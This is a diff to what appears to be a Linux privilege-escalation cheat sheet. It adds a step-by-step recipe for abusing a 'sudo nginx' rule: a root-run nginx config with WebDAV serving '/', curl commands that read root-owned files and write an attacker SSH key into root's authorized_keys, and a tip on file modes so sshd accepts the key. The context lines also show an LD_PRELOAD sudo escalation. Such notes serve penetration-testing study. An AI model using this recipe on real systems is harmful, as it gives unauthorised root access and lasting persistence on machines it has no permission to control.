@@ -75,6 +75,36 @@ gcc -fPIC -shared -o /tmp/priv.so /tmp/priv.c -nostartfiles
 sudo LD_PRELOAD=/tmp/priv.so <allowed_command>
 ```
 
+**sudo nginx (`NOPASSWD: /usr/sbin/nginx`) — arbitrary root file read/write:**
+If nginx is built `--with-http_dav_module` (`nginx -V 2>&1 | grep dav`), run a second root
+master with a WebDAV config: `user root;` makes the worker write/read files as root.
+```nginx
+# /tmp/r.conf — separate port/pid/temp so it won't clash with the production nginx
+user root;
+worker_processes 1;
+pid /tmp/ngx.pid;
+events { worker_connections 64; }
+http {
+  client_body_temp_path /tmp/ngxbody;
+  server {
+    listen 127.0.0.1:8888;
+    root /;
+    autoindex on;                 # GET /root/root.txt reads any file as root
+    dav_methods PUT DELETE MKCOL COPY MOVE;
+    create_full_put_path on;
+    dav_access user:rw;           # 600 — NOT user:rw group:rw all:rw (666 fails sshd StrictModes)
+  }
+}
+```
+```bash
+sudo /usr/sbin/nginx -c /tmp/r.conf
+curl http://127.0.0.1:8888/root/root.txt                       # read root-owned file, or:
+curl -X PUT http://127.0.0.1:8888/root/.ssh/authorized_keys --data-binary @mykey.pub  # then ssh root@
+```
+> Gotcha: `dav_access` sets the PUT file mode. 666 (world-writable) makes sshd ignore the
+> authorized_keys — use `user:rw` for 600. Same pattern abuses any `sudo <daemon>` that takes an
+> attacker config (apache, etc.).
+
 ## SUID Exploitation
 
 ```bash
